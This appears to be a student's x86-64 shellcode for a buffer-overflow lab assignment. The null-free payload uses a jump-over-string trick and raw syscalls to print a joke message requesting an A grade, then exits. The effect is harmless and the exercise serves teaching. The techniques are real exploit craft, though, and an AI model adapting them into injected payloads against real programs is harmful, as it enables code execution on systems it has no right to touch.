shellcode:
    jmp afterString
string:
    .ascii "Thank you, XXXXX.  I recommend that you get a grade of A on this assignment."
afterString:
    xor %eax, %eax
    movb $1, %al 
    xor %rdi, %rdi
    movb $1, %dil 
    lea -0x5d(%rip), %rsi
    movb $76, %dl
    syscall
    xor %eax, %eax
    movb $231, %al
    xor %rdi, %rdi
    syscall
